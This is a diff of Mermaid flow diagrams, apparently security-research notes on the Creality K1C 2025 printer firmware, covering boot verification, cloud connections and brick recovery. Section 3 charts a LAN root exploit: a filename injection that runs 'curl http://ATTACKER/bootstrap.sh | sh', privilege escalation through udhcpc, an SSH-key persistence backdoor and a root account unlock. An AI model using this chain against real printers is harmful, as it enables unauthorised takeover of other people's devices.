@@ -1,23 +1,23 @@
-# Creality K1C 2025 — Flow Diagrams
+# Creality K1C 2025: Flow Diagrams
 
-## 1. Boot Flow (POWER → READY)
+## 1. Boot Flow (POWER to READY)
 
 ```mermaid
 flowchart TD
-    A([POWER ON]) --> B[U-Boot SPL\neMMC offset 0x4600\nencrypted]
-    B --> C[U-Boot 2013.07\nencrypted\nloads kernel from mmcblk0p5]
-    C --> D[Linux 5.10.186\nMIPS32 LE\ninitramfs → RAM]
-    D --> E[/linuxrc\nbusybox init\nreads /etc/inittab]
-    E --> F[/etc/init.d/rcS]
-    F --> G[S10mdev\ndevice manager]
-    G --> H[S20urandom\nRNG seed]
+    A([POWER ON]) --> B["U-Boot SPL<br/>eMMC offset 0x4600<br/>encrypted"]
+    B --> C["U-Boot 2013.07<br/>encrypted<br/>loads kernel from mmcblk0p5"]
+    C --> D["Linux 5.10.186<br/>MIPS32 LE<br/>initramfs to RAM"]
+    D --> E["/linuxrc<br/>busybox init<br/>reads /etc/inittab"]
+    E --> F["/etc/init.d/rcS"]
+    F --> G["S10mdev<br/>device manager"]
+    G --> H["S20urandom<br/>RNG seed"]
     H --> I[S30dbus]
-    I --> J[S40network\nlo interface]
-    J --> K[S50dropbear\nSSH on port 22]
-    K --> L[. /bin/seed.sh\nsourced in rcS shell]
-    L --> M[seed.sh\nsee seed.sh flow]
-    M --> N[run_system_service\nS??* as root]
-    N --> O[run_creality_service\nCS??* as creality]
+    I --> J["S40network<br/>lo interface"]
+    J --> K["S50dropbear<br/>SSH on port 22"]
+    K --> L[". /bin/seed.sh<br/>sourced in rcS shell"]
+    L --> M["seed.sh<br/>see seed.sh flow"]
+    M --> N["run_system_service<br/>S??* as root"]
+    N --> O["run_creality_service<br/>CS??* as creality"]
     O --> P([SYSTEM READY])
 
     style A fill:#2d2d2d,color:#fff
@@ -32,26 +32,26 @@ flowchart TD
 
 ```mermaid
 flowchart TD
-    A([seed.sh start]) --> B[insmod soc_security.ko\nregisters /dev/sc]
-    B --> C[wait_system\npoll for /dev/mmcblk0]
-    C --> D[mount_do_userdata\nfsck + mount mmcblk0p10\n→ /usr/data]
-    D --> E{upg_do\nupgrade pending?}
-    E -->|state file exists| F[cmd_sc -v upgfile\nverify OTA package]
-    F --> G[upgbox -U -f upgfile\nflash partitions]
+    A([seed.sh start]) --> B["insmod soc_security.ko<br/>registers /dev/sc"]
+    B --> C["wait_system<br/>poll for /dev/mmcblk0"]
+    C --> D["mount_do_userdata<br/>fsck + mount mmcblk0p10<br/>to /usr/data"]
+    D --> E{upg_do<br/>upgrade pending?}
+    E -->|state file exists| F["cmd_sc -v upgfile<br/>verify OTA package"]
+    F --> G["upgbox -U -f upgfile<br/>flash partitions"]
     G --> H([reboot])
-    E -->|no upgrade| I[do_reset_clean\nprocess clean_list if present]
-    I --> J[decrypt_sn_mac\ncmd_sc mmcblk0p2\n→ /tmp/params]
-    J --> K[mount_do_deplibs\ncmd_sc -v mmcblk0p7\neFuse + RSA + AES verify]
-    K -->|FAIL| L([halt ← BRICK POINT])
-    K -->|PASS| M[losetup + mount squashfs\n→ /usr/deplibs]
-    M --> N[mount_do_apps\nmount mmcblk0p8 ext4\n→ /usr/apps]
-    N --> O[verify_apps\ncmd_sc decrypt each .bin\n→ /tmp/apps/\nalchemistp nexusp onyxp\nquintusp thirteenthp\nsolusp vectorp mdns]
+    E -->|no upgrade| I["do_reset_clean<br/>process clean_list if present"]
+    I --> J["decrypt_sn_mac<br/>cmd_sc mmcblk0p2<br/>to /tmp/params"]
+    J --> K["mount_do_deplibs<br/>cmd_sc -v mmcblk0p7<br/>eFuse + RSA + AES verify"]
+    K -->|FAIL| L([halt - BRICK POINT])
+    K -->|PASS| M["losetup + mount squashfs<br/>to /usr/deplibs"]
+    M --> N["mount_do_apps<br/>mount mmcblk0p8 ext4<br/>to /usr/apps"]
+    N --> O["verify_apps<br/>cmd_sc decrypt each .bin<br/>to /tmp/apps/<br/>alchemistp nexusp onyxp<br/>quintusp thirteenthp<br/>solusp vectorp mdns"]
     O -->|any FAIL| L
-    O -->|all PASS| P[check_login_permission\n/usr/data/permission exists?\ncmd_sc -v verify\nMAC match → unlock shadow]
-    P --> Q[chattr +i /tmp/shadow\nlocks shadow immutable]
-    Q --> R[init_sys_date\nread /usr/apps/etc/buildtime]
-    R --> S[run_system_service\n/etc/appetc/init.d/S??*\nas root]
-    S --> T[run_creality_service\n/etc/appetc/init.d/CS??*\nas creality user]
+    O -->|all PASS| P["check_login_permission<br/>/usr/data/permission exists?<br/>cmd_sc -v verify<br/>MAC match: unlock shadow"]
+    P --> Q["chattr +i /tmp/shadow<br/>locks shadow immutable"]
+    Q --> R["init_sys_date<br/>read /usr/apps/etc/buildtime"]
+    R --> S["run_system_service<br/>/etc/appetc/init.d/S??*<br/>as root"]
+    S --> T["run_creality_service<br/>/etc/appetc/init.d/CS??*<br/>as creality user"]
     T --> U([seed.sh complete])
 
     style A fill:#2d2d2d,color:#fff
@@ -67,22 +67,22 @@ flowchart TD
 
 ```mermaid
 flowchart TD
-    A([Attacker\nLAN access]) --> B[python3 k1c-2025-exploit.py\n--host-ip ATTACKER\n--printer-ip PRINTER\n--public-key id_ecdsa.pub]
-    B --> C[Start HTTP server\nport 4444\nserving payloads]
-    B --> D[WebSocket connect\nws://PRINTER:9999\nsubprotocol: wsslicer]
-    D --> E[Send JSON\nmethod: set\nparams.print: http://ATTACKER/exploit-TIME]
-    E --> F[vectorp\nprint_proc\nservice_httpchunk_request]
-    F --> G[Printer fetches\nhttp://ATTACKER/exploit-TIME]
-    G --> H[Server responds\nContent-Disposition: filename=\ndest';curl http://ATTACKER/bootstrap.sh | sh;#.gcode]
-    H --> I[Shell injection\nin filename handling]
-    I --> J[Printer fetches\n/bootstrap.sh]
-    J --> K[wget /privesc.py\nudhcpc -s /tmp/privesc.py]
-    K --> L[udhcpc runs privesc.py\nas ROOT\nCAP_NET_ADMIN]
-    L --> M[wget /S999persistence\nchmod +x\nexec S999persistence]
-    M --> N[mkdir /root/.ssh\nchmod 700\necho PUBLIC_KEY\n→ authorized_keys]
-    N --> O[dropbearkey gen\nhost keys]
-    O --> P[chattr -i /tmp/shadow\nsed unlock root account]
-    P --> Q([SSH root@PRINTER\nauthenticated])
+    A(["Attacker<br/>LAN access"]) --> B["python3 k1c-2025-exploit.py<br/>--host-ip ATTACKER<br/>--printer-ip PRINTER<br/>--public-key id_ecdsa.pub"]
+    B --> C["Start HTTP server<br/>port 4444<br/>serving payloads"]
+    B --> D["WebSocket connect<br/>ws://PRINTER:9999<br/>subprotocol: wsslicer"]
+    D --> E["Send JSON<br/>method: set<br/>params.print: http://ATTACKER/exploit-TIME"]
+    E --> F["vectorp<br/>print_proc<br/>service_httpchunk_request"]
+    F --> G["Printer fetches<br/>http://ATTACKER/exploit-TIME"]
+    G --> H["Server responds<br/>Content-Disposition: filename=<br/>dest';curl http://ATTACKER/bootstrap.sh | sh;#.gcode"]
+    H --> I["Shell injection<br/>in filename handling"]
+    I --> J["Printer fetches<br/>/bootstrap.sh"]
+    J --> K["wget /privesc.py<br/>udhcpc -s /tmp/privesc.py"]
+    K --> L["udhcpc runs privesc.py<br/>as ROOT<br/>CAP_NET_ADMIN"]
+    L --> M["wget /S999persistence<br/>chmod +x<br/>exec S999persistence"]
+    M --> N["mkdir /root/.ssh<br/>chmod 700<br/>echo PUBLIC_KEY<br/>to authorized_keys"]
+    N --> O["dropbearkey gen<br/>host keys"]
+    O --> P["chattr -i /tmp/shadow<br/>sed unlock root account"]
+    P --> Q(["SSH root@PRINTER<br/>authenticated"])
 
     style A fill:#2d2d2d,color:#fff
     style Q fill:#1a5c1a,color:#fff
@@ -92,30 +92,30 @@ flowchart TD
 
 ---
 
-## 4. Print Flow (Touch → Motion)
+## 4. Print Flow (Touch to Motion)
 
 ```mermaid
 flowchart TD
-    A([User touches\nscreen]) --> B[vectorp\nLVGL UI\n/tmp/apps/vectorp]
-    B --> C[Select gcode file\nfrom /usr/data/printer_data/gcodes]
-    C --> D[wsKlipper::sendGcodeFile\nvia solusp IPC]
-    D --> E[solusp\n/tmp/apps/solusp]
-    E --> F[wsKlipper class\nUnix socket /tmp/klippy_uds]
-    F --> G[Klipper\npython klippy.py\nrunning as creality]
-    G --> H[Parse gcode\nsequence planning]
-    H --> I[Serial commands\nto MCU]
-    I --> J[MCU\ntoolhead microcontroller]
-    J --> K[Stepper drivers\nX Y Z E motion]
-    J --> L[Hotend heater\ntemperature control]
-    J --> M[Bed heater\ntemperature control]
-    J --> N[Part cooling fan\nspeed control]
-    G --> O[Status updates\nvia klippy_uds]
+    A(["User touches<br/>screen"]) --> B["vectorp<br/>LVGL UI<br/>/tmp/apps/vectorp"]
+    B --> C["Select gcode file<br/>from /usr/data/printer_data/gcodes"]
+    C --> D["wsKlipper::sendGcodeFile<br/>via solusp IPC"]
+    D --> E["solusp<br/>/tmp/apps/solusp"]
+    E --> F["wsKlipper class<br/>Unix socket /tmp/klippy_uds"]
+    F --> G["Klipper<br/>python klippy.py<br/>running as creality"]
+    G --> H["Parse gcode<br/>sequence planning"]
+    H --> I["Serial commands<br/>to MCU"]
+    I --> J["MCU<br/>toolhead microcontroller"]
+    J --> K["Stepper drivers<br/>X Y Z E motion"]
+    J --> L["Hotend heater<br/>temperature control"]
+    J --> M["Bed heater<br/>temperature control"]
+    J --> N["Part cooling fan<br/>speed control"]
+    G --> O["Status updates<br/>via klippy_uds"]
     O --> E
-    E --> P[IPC → vectorp\nlayer count, temps, %]
+    E --> P["IPC to vectorp<br/>layer count, temps, %"]
     P --> B
 
-    B2[nexusp\nport 7125] --> G
-    B3[Fluidd/Mainsail\nbrowser :4408/:4409] --> B2
+    B2["nexusp<br/>port 7125"] --> G
+    B3["Fluidd/Mainsail<br/>browser :4408/:4409"] --> B2
 
     style A fill:#2d2d2d,color:#fff
     style J fill:#1a3a5c,color:#fff
@@ -136,24 +136,24 @@ flowchart TD
     end
 
     subgraph Creality Cloud
-        MQTT[mqtt.crealitycloud.cn\nmqtt.crealitycloud.com\nport 1883 plaintext]
-        API[api.crealitycloud.cn\napi.crealitycloud.com\nHTTPS]
-        WRT[admin-pre.crealitycloud.cn\nWebRTC signaling WSS]
-        OSS[Alibaba OSS\nlog + timelapse upload]
-        UNK[58.48.202.36\nhardcoded IP\nUNKNOWN PURPOSE]
+        MQTT["mqtt.crealitycloud.cn<br/>mqtt.crealitycloud.com<br/>port 1883 plaintext"]
+        API["api.crealitycloud.cn<br/>api.crealitycloud.com<br/>HTTPS"]
+        WRT["admin-pre.crealitycloud.cn<br/>WebRTC signaling WSS"]
+        OSS["Alibaba OSS<br/>log + timelapse upload"]
+        UNK["58.48.202.36<br/>hardcoded IP<br/>UNKNOWN PURPOSE"]
     end
 
     subgraph LAN
-        DEV[Other LAN devices\nmDNS discovery]
+        DEV["Other LAN devices<br/>mDNS discovery"]
     end
 
-    V -->|publish: cx_machine.system_info\ncx_machine.proc_stats| MQTT
-    V -->|device register\nfirmware list\nowner binding| API
-    V -->|Alibaba STS credentials\nlog + timelapse files| OSS
+    V -->|"publish: cx_machine.system_info<br/>cx_machine.proc_stats"| MQTT
+    V -->|"device register<br/>firmware list<br/>owner binding"| API
+    V -->|"Alibaba STS credentials<br/>log + timelapse files"| OSS
     A -->|unknown protocol| UNK
-    O -->|WebRTC signaling\nJWT auth| WRT
-    T -->|DTLS/SRTP\nmedia stream| WRT
-    M -->|UDP broadcast\n_Creality-SN._udp.local| DEV
+    O -->|"WebRTC signaling<br/>JWT auth"| WRT
+    T -->|"DTLS/SRTP<br/>media stream"| WRT
+    M -->|"UDP broadcast<br/>_Creality-SN._udp.local"| DEV
 
     style UNK fill:#8b0000,color:#fff
     style MQTT fill:#5c3a1a,color:#fff
@@ -167,31 +167,31 @@ flowchart TD
 
 ```mermaid
 flowchart TD
-    A([mmcblk0p7 corrupted\nor verification fails]) --> B[seed.sh\nmount_do_deplibs\ncmd_sc -v FAILS]
-    
+    A(["mmcblk0p7 corrupted<br/>or verification fails"]) --> B["seed.sh<br/>mount_do_deplibs<br/>cmd_sc -v FAILS"]
+
     subgraph Current Behavior
-        B --> C([halt\nBRICK — no recovery])
+        B --> C([halt - no recovery])
     end
 
     subgraph Patched Behavior
-        B --> D[log warning\ncontinue without halt]
-        D --> E[mount attempt\nsquashfs may still mount\nif data intact]
-        E --> F[mount_do_apps\n/usr/apps still mounts]
-        F --> G[S999persistence runs\nfrom /usr/apps/etc/init.d/]
-        G --> H[Recovery dropbear starts\nfrom /usr/apps/bin/dropbear]
-        H --> I([SSH root access\nover LAN])
-        I --> J[dd restore from backup\nmmcblk0p7 from eMMC image]
+        B --> D["log warning<br/>continue without halt"]
+        D --> E["mount attempt<br/>squashfs may still mount<br/>if data intact"]
+        E --> F["mount_do_apps<br/>/usr/apps still mounts"]
+        F --> G["S999persistence runs<br/>from /usr/apps/etc/init.d/"]
+        G --> H["Recovery dropbear starts<br/>from /usr/apps/bin/dropbear"]
+        H --> I(["SSH root access<br/>over LAN"])
+        I --> J["dd restore from backup<br/>mmcblk0p7 from eMMC image"]
         J --> K[reboot]
-        K --> L([Normal boot\nrecovered])
+        K --> L([Normal boot - recovered])
     end
 
     subgraph Requirements
-        R1[Modified seed.sh\nhalt removed]
-        R2[Kernel repacked\nwith new initramfs]
-        R3[Signed with own RSA key\nvia soc_security.ko bypass]
+        R1["Modified seed.sh<br/>halt removed"]
+        R2["Kernel repacked<br/>with new initramfs"]
+        R3["Signed with own RSA key<br/>via soc_security.ko bypass"]
         R4[Flashed to mmcblk0p5]
-        R5[dropbear copy\nin /usr/apps/bin/]
-        R6[eMMC backup\non host machine]
+        R5["dropbear copy<br/>in /usr/apps/bin/"]
+        R6["eMMC backup<br/>on host machine"]
     end
 
     style A fill:#8b0000,color:#fff
